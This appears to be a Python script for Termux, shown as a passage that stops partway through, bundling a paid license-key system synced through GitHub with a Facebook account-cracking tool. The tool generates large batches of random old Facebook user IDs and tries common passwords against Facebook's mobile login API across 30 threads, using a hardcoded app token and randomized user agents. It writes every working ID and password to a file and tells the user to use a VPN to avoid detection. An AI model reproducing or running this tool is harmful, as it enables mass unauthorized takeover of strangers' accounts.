# -*- coding: utf-8 -*-
import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
import urllib.request
import platform
import subprocess
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from datetime import datetime, date, timedelta
from cryptography.fernet import Fernet

# ========== ENCRYPTION CONFIG ==========
SECRET_KEY = b'41EO8mHDgVMVPdE6vOqSKWC-O6I9v-TrwZkL9exJrlU='

def encrypt_keys(keys):
    f = Fernet(SECRET_KEY)
    return f.encrypt(json.dumps(keys).encode())

def decrypt_keys(encrypted):
    f = Fernet(SECRET_KEY)
    return json.loads(f.decrypt(encrypted).decode())

# ========== GITHUB CONFIG ==========
GITHUB_REPO_PATH = os.path.expanduser("~/Siyam-Tool")
GITHUB_KEYS_FILE = os.path.join(GITHUB_REPO_PATH, "approved_keys.enc")

# ========== PLATFORM DETECT ==========
SYSTEM = platform.system()
IS_ANDROID = (SYSTEM == "Android")
IS_IOS = (SYSTEM == "Darwin")

# ========== COLORS ==========
if IS_ANDROID:
    R = '\033[1;31m'
    G = '\033[1;32m'
    Y = '\033[1;33m'
    B = '\033[1;34m'
    P = '\033[1;35m'
    C = '\033[1;36m'
    W = '\033[1;37m'
    RESET = '\033[0m'
else:
    R = G = Y = B = P = C = W = RESET = ""

# ========== FILE PATHS ==========
def get_base_path():
    if IS_ANDROID:
        return "/sdcard/"
    else:
        return os.path.expanduser("~/")

BASE_PATH = get_base_path()
KEY_FILE = os.path.join(BASE_PATH, "approved_keys.enc")
USER_KEY_FILE = os.path.join(BASE_PATH, "siyam_user_key.txt")
OK_FILE_1 = os.path.join(BASE_PATH, "SIYAM-OLD-M1-OK.txt")
OK_FILE_2 = os.path.join(BASE_PATH, "SIYAM-OLD-M2-OK.txt")

ADMIN_LINK = "https://wa.me/message/5D3OD2FT3EYVJ1"
ADMIN_NUMBER = "+60167442160"

# ========== GITHUB SYNC ==========
def pull_from_github():
    try:
        if not os.path.exists(GITHUB_REPO_PATH):
            print(f"{Y}[!]{RESET} Cloning repository...")
            subprocess.run(["git", "clone", "https://github.com/Siyamahmed1122/Siyam-Tool.git", GITHUB_REPO_PATH], check=True)
        
        os.chdir(GITHUB_REPO_PATH)
        subprocess.run(["git", "pull", "origin", "main"], check=True, capture_output=True)
        
        if os.path.exists(GITHUB_KEYS_FILE):
            subprocess.run(["cp", GITHUB_KEYS_FILE, KEY_FILE], check=True)
            print(f"{G}[✓]{RESET} Keys synced from GitHub!")
            return True
        else:
            print(f"{Y}[!]{RESET} No encrypted keys file found, creating new...")
            return False
    except Exception as e:
        print(f"{R}[!]{RESET} GitHub pull failed: {e}")
        return False

def push_to_github():
    try:
        os.chdir(GITHUB_REPO_PATH)
        
        if os.path.exists(KEY_FILE):
            subprocess.run(["cp", KEY_FILE, GITHUB_KEYS_FILE], check=True)
        else:
            print(f"{R}[!]{RESET} Key file not found!")
            return
        
        subprocess.run(["git", "config", "user.name", "Siyamahmed1122"], capture_output=True)
        subprocess.run(["git", "config", "user.email", "mdsiyammadbor@gmail.com"], capture_output=True)
        
        subprocess.run(["git", "add", "approved_keys.enc"], check=True, capture_output=True)
        
        result = subprocess.run(["git", "commit", "-m", "Auto-update encrypted keys"], capture_output=True)
        
        if result.returncode == 0:
            subprocess.run(["git", "push", "origin", "main"], check=True, capture_output=True)
            print(f"{G}[✓]{RESET} Encrypted keys pushed to GitHub!")
        else:
            if "nothing to commit" in result.stderr.decode():
                print(f"{Y}[i]{RESET} No changes to push.")
            else:
                print(f"{R}[!]{RESET} Commit failed: {result.stderr.decode()}")
    except Exception as e:
        print(f"{R}[!]{RESET} GitHub push error: {e}")

# ========== VOICE (UNIVERSAL - Works on all phones) ==========
def speak(message):
    try:
        os.system(f'termux-tts-speak "{message}" 2>/dev/null')
    except:
        try:
            os.system(f'espeak "{message}" 2>/dev/null')
        except:
            try:
                os.system(f'say "{message}" 2>/dev/null')
            except:
                print(f"{Y}[!]{RESET} {message}")
    
    print(f"{C}[✓]{RESET} {message}")

# ========== LINK OPEN ==========
def open_admin_contact(admin_link, admin_number, user_key, is_renew=False):
    if is_renew:
        msg = f"Hello Admin, my key has expired. Please renew: {user_key}"
    else:
        msg = f"Hello Admin, please approve my key: {user_key}"
    
    encoded_msg = urllib.parse.quote(msg)
    wa_link = f"https://wa.me/{admin_number[1:]}?text={encoded_msg}"
    
    if IS_ANDROID:
        os.system(f'am start -a android.intent.action.VIEW -d "{wa_link}" > /dev/null 2>&1 &')
        print(f"\n{' ' * 8}{G}[+]{RESET} Opening WhatsApp...")
        return True
    elif IS_IOS:
        os.system(f'open "{wa_link}" 2>/dev/null')
        return True
    else:
        print(f"\n{' ' * 8}{Y}[!]{RESET} Manual Steps:")
        print(f"{' ' * 8}{G}[+]{RESET} Copy Key: {user_key}")
        print(f"{' ' * 8}{G}[+]{RESET} Send to: {admin_number}")
        print(f"{' ' * 8}{G}[+]{RESET} Or open: {wa_link}")
        return False

# ========== PRINT FUNCTIONS ==========
def print_line():
    print(f"{C}{'=' * 50}{RESET}")

def print_box(text, color=G):
    width = 50
    spaces = (width - len(text)) // 2
    print(f"{C}{'=' * width}{RESET}")
    print(f"{' ' * spaces}{color}{text}{RESET}")
    print(f"{C}{'=' * width}{RESET}")

# ========== BANNER ==========
def banner():
    os.system("clear")
    print(f"{G}")
    print("    ███████╗██╗██╗   ██╗ █████╗ ███╗   ███╗")
    print("    ██╔════╝██║╚██╗ ██╔╝██╔══██╗████╗ ████║")
    print("    ███████╗██║ ╚████╔╝ ███████║██╔████╔██║")
    print("    ╚════██║██║  ╚██╔╝  ██╔══██║██║╚██╔╝██║")
    print("    ███████║██║   ██║   ██║  ██║██║ ╚═╝ ██║")
    print("    ╚══════╝╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝")
    print(f"{RESET}")

# ========== AUTO DELETE EXPIRED KEYS ==========
def auto_delete_expired_keys():
    keys = load_approved_keys()
    today = date.today()
    now = datetime.now()
    deleted_count = 0
    new_keys = []
    
    for item in keys:
        if item["expiry"] == "unlimited":
            new_keys.append(item)
        else:
            if " " in item["expiry"]:
                expiry_time = datetime.strptime(item["expiry"], "%Y-%m-%d %H:%M:%S")
                days_since_expiry = (now - expiry_time).days
                if days_since_expiry <= 30:
                    new_keys.append(item)
                else:
                    deleted_count += 1
                    print(f"{Y}[!]{RESET} Auto-deleted expired key: {item['key']}")
            else:
                expiry_date = datetime.strptime(item["expiry"], "%Y-%m-%d").date()
                days_since_expiry = (today - expiry_date).days
                if days_since_expiry <= 30:
                    new_keys.append(item)
                else:
                    deleted_count += 1
                    print(f"{Y}[!]{RESET} Auto-deleted expired key: {item['key']}")
    
    if deleted_count > 0:
        save_approved_keys(new_keys)
        push_to_github()

# ========== JSON FUNCTIONS ==========
def load_approved_keys():
    try:
        with open(KEY_FILE, "rb") as f:
            encrypted = f.read()
        keys = decrypt_keys(encrypted)
        new_keys = []
        for item in keys:
            if isinstance(item, str):
                new_keys.append({"key": item, "expiry": "unlimited"})
            else:
                new_keys.append(item)
        if new_keys != keys:
            save_approved_keys(new_keys)
        return new_keys
    except:
        default_keys = [{"key": "SIYAM-MAHMUD-2022", "expiry": "unlimited"}]
        save_approved_keys(default_keys)
        return default_keys

def save_approved_keys(keys):
    encrypted = encrypt_keys(keys)
    with open(KEY_FILE, "wb") as f:
        f.write(encrypted)

def add_new_key(new_key, expiry_days=None):
    keys = load_approved_keys()
    for item in keys:
        if item["key"] == new_key:
            print(f"{R}[-]{RESET} Already exists: {new_key}")
            return False
    if expiry_days == "unlimited" or expiry_days is None:
        expiry = "unlimited"
    else:
        expiry_date = date.today() + timedelta(days=int(expiry_days))
        expiry = expiry_date.strftime("%Y-%m-%d")
    keys.append({"key": new_key, "expiry": expiry})
    save_approved_keys(keys)
    push_to_github()
    print(f"{G}[+]{RESET} Added: {new_key}")
    return True

def add_hours_key(new_key, hours=None):
    keys = load_approved_keys()
    for item in keys:
        if item["key"] == new_key:
            print(f"{R}[-]{RESET} Already exists: {new_key}")
            return False
    
    if hours is None:
        expiry = "unlimited"
    else:
        expiry_time = datetime.now() + timedelta(hours=int(hours))
        expiry = expiry_time.strftime("%Y-%m-%d %H:%M:%S")
    
    keys.append({"key": new_key, "expiry": expiry})
    save_approved_keys(keys)
    push_to_github()
    print(f"{G}[+]{RESET} Added: {new_key}")
    return True

def remove_key_by_index(index):
    keys = load_approved_keys()
    if 1 <= index <= len(keys):
        removed = keys.pop(index - 1)
        save_approved_keys(keys)
        push_to_github()
        print(f"{G}[+]{RESET} Deleted: {removed['key']}")
        return True
    else:
        print(f"{R}[-]{RESET} Invalid index! Choose 1-{len(keys)}")
        return False

def is_key_valid(user_key):
    keys = load_approved_keys()
    now = datetime.now()
    today = date.today()
    
    for item in keys:
        if item["key"] == user_key:
            if item["expiry"] == "unlimited":
                return True
            else:
                if " " in item["expiry"]:
                    expiry_time = datetime.strptime(item["expiry"], "%Y-%m-%d %H:%M:%S")
                    if now <= expiry_time:
                        return True
                    else:
                        print(f"\n{'='*50}")
                        print(f"{R}[!] YOUR KEY HAS EXPIRED!{RESET}")
                        print(f"{Y}[!] Expired on: {item['expiry']}{RESET}")
                        print(f"{Y}[!] You have 30 days to renew before auto-delete{RESET}")
                        print(f"{C}[+] Contact admin: {ADMIN_NUMBER}{RESET}")
                        print(f"{'='*50}\n")
                        speak("Your key has expired. Please contact admin to renew.")
                        return False
                else:
                    expiry_date = datetime.strptime(item["expiry"], "%Y-%m-%d").date()
                    if today <= expiry_date:
                        return True
                    else:
                        print(f"\n{'='*50}")
                        print(f"{R}[!] YOUR KEY HAS EXPIRED!{RESET}")
                        print(f"{Y}[!] Expired on: {item['expiry']}{RESET}")
                        print(f"{Y}[!] You have 30 days to renew before auto-delete{RESET}")
                        print(f"{C}[+] Contact admin: {ADMIN_NUMBER}{RESET}")
                        print(f"{'='*50}\n")
                        speak("Your key has expired. Please contact admin to renew.")
                        return False
    return False

def show_all_keys(show_expired_only=False):
    keys = load_approved_keys()
    today = date.today()
    now = datetime.now()
    print(f"\n{C}{'=' * 60}{RESET}")
    if show_expired_only:
        print(f"{C}{' ' * 18}EXPIRED KEYS ONLY{RESET}")
    else:
        print(f"{C}{' ' * 22}ALL KEYS{RESET}")
    print(f"{C}{'=' * 60}{RESET}")
    count = 0
    for i, item in enumerate(keys, 1):
        if item["expiry"] == "unlimited":
            expiry_show = f"{G}unlimited{RESET}"
            is_expired = False
        else:
            if " " in item["expiry"]:
                expiry_time = datetime.strptime(item["expiry"], "%Y-%m-%d %H:%M:%S")
                if expiry_time < now:
                    expiry_show = f"{R}EXPIRED on {item['expiry']}{RESET}"
                    is_expired = True
                else:
                    expiry_show = f"{Y}Expires: {item['expiry']}{RESET}"
                    is_expired = False
            else:
                expiry_date = datetime.strptime(item["expiry"], "%Y-%m-%d").date()
                if expiry_date < today:
                    expiry_show = f"{R}EXPIRED on {item['expiry']}{RESET}"
                    is_expired = True
                else:
                    expiry_show = f"{Y}Expires: {item['expiry']}{RESET}"
                    is_expired = False
        if show_expired_only and not is_expired:
            continue
        count += 1
        status = "EXPIRED" if is_expired else "ACTIVE"
        print(f"{' ' * 10}{i}. {C}{item['key']}{RESET} - {expiry_show} [{status}]")
    if count == 0:
        print(f"{Y}{' ' * 20}No keys found!{RESET}")
    if show_expired_only:
        print(f"{C}{'=' * 60}{RESET}")
        print(f"{Y}[!]{RESET} To renew expired keys, use option 4 and paste the key{RESET}")
    print(f"{C}{'=' * 60}{RESET}")

# ========== PERMANENT USER KEY (Same key forever on same device) ==========
def get_device_unique_id():
    device_id_file = os.path.join(BASE_PATH, ".siyam_device_id")
    
    try:
        if os.path.exists(device_id_file):
            with open(device_id_file, "r") as f:
                return f.read().strip()
    except:
        pass
    
    unique_id = ""
    try:
        result = subprocess.run(['getprop', 'ro.serialno'], capture_output=True, text=True)
        if result.stdout and result.stdout.strip():
            unique_id = result.stdout.strip()
        else:
            result = subprocess.run(['getprop', 'ro.boot.serialno'], capture_output=True, text=True)
            if result.stdout and result.stdout.strip():
                unique_id = result.stdout.strip()
            else:
                result = subprocess.run(['getprop', 'ro.build.fingerprint'], capture_output=True, text=True)
                if result.stdout and result.stdout.strip():
                    unique_id = result.stdout.strip()[:20]
    except:
        pass
    
    if not unique_id:
        unique_id = BASE_PATH
    
    device_hash = hashlib.md5(f"SIYAM_PERMANENT_{unique_id}".encode()).hexdigest()[:15]
    
    try:
        with open(device_id_file, "w") as f:
            f.write(device_hash)
    except:
        pass
    
    return device_hash

def generate_permanent_key():
    device_id = get_device_unique_id()
    key_hash = hashlib.md5(f"SIYAM_KEY_{device_id}".encode()).hexdigest()[:6].upper()
    return f"SIYAM-{key_hash}"

def save_user_key(key):
    with open(USER_KEY_FILE, "w") as f:
        f.write(key)

def get_user_key():
    try:
        if os.path.exists(USER_KEY_FILE):
            with open(USER_KEY_FILE, "r") as f:
                existing_key = f.read().strip()
                if existing_key and existing_key.startswith("SIYAM-") and len(existing_key) >= 11:
                    return existing_key
    except:
        pass
    
    new_key = generate_permanent_key()
    save_user_key(new_key)
    return new_key

# ========== RENEW FUNCTION (By Value) ==========
def renew_key_by_value():
    print(f"\n{C}{'=' * 60}{RESET}")
    print(f"{C}{' ' * 20}RENEW KEY BY VALUE{RESET}")
    print(f"{C}{'=' * 60}{RESET}")
    user_key = input(f"{Y}Enter the key (e.g., SIYAM-123456): {RESET}").strip().upper()
    keys = load_approved_keys()
    found = False
    for item in keys:
        if item["key"] == user_key:
            found = True
            if item["expiry"] == "unlimited":
                print(f"{R}[-]{RESET} Unlimited key cannot be renewed!")
                return
            print(f"{Y}[!]{RESET} Current expiry: {item['expiry']}")
            print(f"{G}What do you want to add?{RESET}")
            print(f"{C}   1. Add Days{RESET}")
            print(f"{C}   2. Add Hours{RESET}")
            choice = input(f"{G}>>>{RESET} Choose (1/2): ")
            
            if choice == "1":
                days = input(f"{G}Enter days to add: {RESET}")
                if " " in item["expiry"]:
                    old_expiry = datetime.strptime(item["expiry"], "%Y-%m-%d %H:%M:%S")
                    new_expiry = old_expiry + timedelta(days=int(days))
                    item["expiry"] = new_expiry.strftime("%Y-%m-%d %H:%M:%S")
                else:
                    old_expiry = datetime.strptime(item["expiry"], "%Y-%m-%d").date()
                    new_expiry = old_expiry + timedelta(days=int(days))
                    item["expiry"] = new_expiry.strftime("%Y-%m-%d")
            else:
                hours = input(f"{G}Enter hours to add: {RESET}")
                if " " in item["expiry"]:
                    old_expiry = datetime.strptime(item["expiry"], "%Y-%m-%d %H:%M:%S")
                    new_expiry = old_expiry + timedelta(hours=int(hours))
                    item["expiry"] = new_expiry.strftime("%Y-%m-%d %H:%M:%S")
                else:
                    old_expiry = datetime.strptime(item["expiry"], "%Y-%m-%d").date()
                    new_expiry = datetime.combine(old_expiry, datetime.min.time()) + timedelta(hours=int(hours))
                    item["expiry"] = new_expiry.strftime("%Y-%m-%d %H:%M:%S")
            
            save_approved_keys(keys)
            push_to_github()
            print(f"\n{G}{'=' * 60}{RESET}")
            print(f"{G}[✓]{RESET} Key renewed successfully!")
            print(f"{G}[+]{RESET} Key: {item['key']}")
            print(f"{G}[+]{RESET} New expiry: {item['expiry']}")
            print(f"{G}{'=' * 60}{RESET}")
            speak("Key renewed successfully")
            return
    if not found:
        print(f"{R}[-]{RESET} Key '{user_key}' not found in database!")

# ========== ADMIN PANEL ==========
def admin_panel():
    while True:
        os.system("clear")
        print(f"{C}{'=' * 60}{RESET}")
        print(f"{C}{' ' * 22}ADMIN PANEL{RESET}")
        print(f"{C}{'=' * 60}{RESET}")
        print(f"\n{G}{' ' * 15}1. Add New Key (With Days){RESET}")
        print(f"{G}{' ' * 15}2. Add Unlimited Key{RESET}")
        print(f"{Y}{' ' * 15}3. Add Key (With Hours){RESET}")
        print(f"{C}{' ' * 15}4. Renew Key By Value (Paste Key){RESET}")
        print(f"{R}{' ' * 15}5. Delete Key (By Number){RESET}")
        print(f"{C}{' ' * 15}6. Show All Keys{RESET}")
        print(f"{R}{' ' * 15}7. Show Expired Keys Only{RESET}")
        print(f"{R}{' ' * 15}8. Delete ALL Keys{RESET}")
        print(f"{B}{' ' * 15}9. Reset My Own Key (Get New Key){RESET}")
        print(f"{B}{' ' * 15}0. Back to Main Menu{RESET}\n")
        print(f"{C}{'=' * 60}{RESET}")
        choice = input(f"{G}>>>{RESET} Choose (1-0): ")
        
        if choice == "1":
            new_key = input(f"{Y}Enter new key:{RESET} ").strip().upper()
            days = input(f"{Y}Enter days (1,7,30,60,90,365):{RESET} ")
            add_new_key(new_key, days)
        elif choice == "2":
            new_key = input(f"{Y}Enter new key:{RESET} ").strip().upper()
            add_new_key(new_key, "unlimited")
        elif choice == "3":
            new_key = input(f"{Y}Enter new key:{RESET} ").strip().upper()
            hours = input(f"{Y}Enter hours (1,2,3,6,12,24):{RESET} ")
            add_hours_key(new_key, hours)
        elif choice == "4":
            renew_key_by_value()
        elif choice == "5":
            show_all_keys()
            try:
                idx = int(input(f"{R}Enter number to delete:{RESET} "))
                remove_key_by_index(idx)
            except ValueError:
                print(f"{R}[-]{RESET} Invalid input!")
        elif choice == "6":
            show_all_keys()
        elif choice == "7":
            show_all_keys(show_expired_only=True)
        elif choice == "8":
            print(f"{R}[!]{RESET} Are you sure? This will DELETE ALL approved keys!")
            confirm = input(f"{Y}Type 'DELETE ALL' to confirm: {RESET}")
            if confirm == "DELETE ALL":
                keys = [{"key": "SIYAM-MAHMUD-2022", "expiry": "unlimited"}]
                save_approved_keys(keys)
                push_to_github()
                print(f"{G}[✓]{RESET} All keys deleted! Only master key remains.")
            else:
                print(f"{Y}[!]{RESET} Cancelled.")
        elif choice == "9":
            try:
                if os.path.exists(USER_KEY_FILE):
                    os.remove(USER_KEY_FILE)
                device_id_file = os.path.join(BASE_PATH, ".siyam_device_id")
                if os.path.exists(device_id_file):
                    os.remove(device_id_file)
                print(f"{G}[✓]{RESET} Your local key has been reset!")
                print(f"{Y}[!]{RESET} Restart the tool to generate new key.")
            except:
                print(f"{R}[!]{RESET} Failed to reset.")
            input(f"\n{Y}[Press ENTER]{RESET}")
            return
        elif choice == "0":
            print(f"{G}[+]{RESET} Going back...")
            return
        else:
            print(f"{R}[-]{RESET} Wrong choice!")
        input(f"\n{Y}[Press ENTER]{RESET}")

# ========== FACEBOOK TOOL CODE ==========
method = []
oks = []
cps = []
loop = 0
user = []

X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G2 = '\x1b[38;5;46m'
Y2 = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'
RR = '\x1b[38;5;196m'
GS = '\x1b[38;5;40m'
W2 = '\x1b[1;37m'

def windows():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C2 = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
    return random.choice([A, B, C2, D])

def window1():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C2 = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
    latest_build = rr(6000, 9000)
    latest_patch = rr(100, 200)
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C2, D])

def creationyear(uid):
    if len(uid) == 15:
        if uid.startswith('1000000000'):
            return '2009'
        if uid.startswith('100000000'):
            return '2009'
        if uid.startswith('10000000'):
            return '2009'
        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
            return '2009'
        if uid.startswith(('1000006', '1000007', '1000008', '1000009')):
            return '2010'
        if uid.startswith('100001'):
            return '2010'
        if uid.startswith(('100002', '100003')):
            return '2011'
        if uid.startswith('100004'):
            return '2012'
        if uid.startswith(('100005', '100006')):
            return '2013'
        if uid.startswith(('100007', '100008')):
            return '2014'
        if uid.startswith('100009'):
            return '2015'
        if uid.startswith('10001'):
            return '2016'
        if uid.startswith('10002'):
            return '2017'
        if uid.startswith('10003'):
            return '2018'
        if uid.startswith('10004'):
            return '2019'
        if uid.startswith('10005'):
            return '2020'
        if uid.startswith('10006'):
            return '2021'
        if uid.startswith('10009'):
            return '2023'
        if uid.startswith(('10007', '10008')):
            return '2022'
        return ''
    elif len(uid) in (9, 10):
        return '2008'
    elif len(uid) == 8:
        return '2007'
    elif len(uid) == 7:
        return '2006'
    elif len(uid) == 14 and uid.startswith('61'):
        return '2024'
    else:
        return ''

def linex():
    print('\x1b[38;5;48m====================================')

def BNG_71_():
    banner()
    print('       (A) OLD CLONE')
    linex()
    print('📡 VPN Recommended: Japan / US / Singapore')
    linex()
    choice = input("CHOICE: ")
    if choice.upper() in ('A', '01', '1'):
        old_clone()
    else:
        print(f"\n[!] Choose Valid Option...")
        time.sleep(2)
        BNG_71_()

def old_clone():
    banner()
    print('       (A) ALL SERIES')
    linex()
    print('       (B) 4 SERIES')
    linex()
    print('       (C) 2009 series')
    linex()
    _input = input("CHOICE: ")
    if _input.upper() in ('A', '01', '1'):
        old_One()
    elif _input.upper() in ('B', '02', '2'):
        old_Tow()
    elif _input.upper() in ('C', '03', '3'):
        old_Tree()
    else:
        print(f"\n[!] Choose Valid Option...")
        BNG_71_()

def old_One():
    user = []
    banner()
    print("Old Code: 2010-2014")
    ask = input("SELECT: ")
    linex()
    banner()
    print("EXAMPLE: 20000 / 30000 / 99999")
    
    try:
        limit = int(input("SELECT: "))
    except ValueError:
        print(f"{R}[!]{RESET} Please enter a valid number!")
        time.sleep(2)
        BNG_71_()
        return
    
    linex()
    star = '10000'
    for _ in range(limit):
        if ask == '1':
            data = str(random.randint(1000000000, 1999999999))
        else:
            data = str(random.randint(1000000000, 4999999999))
        user.append(data)
    print('        METHOD 1')
    print('        METHOD 2')
    linex()
    meth = input("CHOICE (A/B): ").strip().upper()
    with tred(max_workers=30) as pool:
        banner()
        print(f"TOTAL ID FROM CRACK: {limit}")
        print("USE AIRPLANE MOD FOR GOOD RESULT")
        print("📡 RECOMMENDED VPN: Japan, US, Singapore")
        print("   Use VPN for better performance and more valid IDs")
        linex()
        for mal in user:
            uid = star + mal
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)

def old_Tow():
    user = []
    banner()
    print("OLD CODE: 2010-2014")
    ask = input("SELECT: ")
    linex()
    banner()
    print("EXAMPLE: 20000 / 30000 / 99999")
    
    try:
        limit = int(input("SELECT: "))
    except ValueError:
        print(f"{R}[!]{RESET} Please enter a valid number!")
        time.sleep(2)
        BNG_71_()
        return
    
    linex()
    prefixes = ['100003', '100004']
    for _ in range(limit):
        prefix = random.choice(prefixes)
        suffix = ''.join(str(random.randint(0, 9)) for _ in range(9))
        uid = prefix + suffix
        user.append(uid)
    print('METHOD A')
    print('METHOD B')
    linex()
    meth = input("CHOICE (A/B): ").strip().upper()
    with tred(max_workers=30) as pool:
        banner()
        print(f"TOTAL ID FROM CRACK: {limit}")
        print("USE AIRPLANE MOD FOR GOOD RESULT")
        print("📡 RECOMMENDED VPN: Japan, US, Singapore")
        print("   Use VPN for better performance and more valid IDs")
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)

def old_Tree():
    user = []
    banner()
    print("OLD CODE: 2009-2010")
    ask = input("SELECT: ")
    linex()
    banner()
    print("EXAMPLE: 20000 / 30000 / 99999")
    
    try:
        limit = int(input("TOTAL ID COUNT: "))
    except ValueError:
        print(f"{R}[!]{RESET} Please enter a valid number!")
        time.sleep(2)
        BNG_71_()
        return
    
    linex()
    prefix = '1000004'
    for _ in range(limit):
        suffix = ''.join(str(random.randint(0, 9)) for _ in range(8))
        uid = prefix + suffix
        user.append(uid)
    print('METHOD A')
    print('Method B')
    linex()
    meth = input("CHOICE (A/B): ").strip().upper()
    with tred(max_workers=30) as pool:
        banner()
        print(f"TOTAL ID FROM CRACK: {limit}")
        print("USE AIRPLANE MOD FOR GOOD RESULT")
        print("📡 RECOMMENDED VPN: Japan, US, Singapore")
        print("   Use VPN for better performance and more valid IDs")
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)

def login_1(uid):
    global loop
    session = requests.session()
    try:
        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            
            if 'session_key' in res:
                speak("Valid Id Found")
                profile_link = f"https://facebook.com/{uid}"
                
                print(f"\n{'='*50}")
                print(f"[+] UID       : {uid}")
                print(f"[+] PASSWORD  : {pw}")
                print(f"[+] PROFILE   : {profile_link}")
                print(f"{'='*50}\n")
                
                open('/sdcard/SIYAM-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}|{profile_link}\n")
                oks.append(uid)
                break
                
            elif 'www.facebook.com' in str(res.get('error', {}).get('message', '')):
                speak("Valid Id Found")
                profile_link = f"https://facebook.com/{uid}"
                
                print(f"\n{'='*50}")
                print(f"[+] UID       : {uid}")
                print(f"[+] PASSWORD  : {pw}")
                print(f"[+] PROFILE   : {profile_link}")
                print(f"{'='*50}\n")
                
                open('/sdcard/SIYAM-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}|{profile_link}\n")
                oks.append(uid)
                break
                
        loop += 1
    except Exception:
        time.sleep(5)
    
    sys.stdout.write(f"\r[SIYAM-M1] LOOP:{loop} OK:{len(oks)}")
    sys.stdout.flush()

def login_2(uid):
    global loop
    
    for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
        try:
            session = requests.session()
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
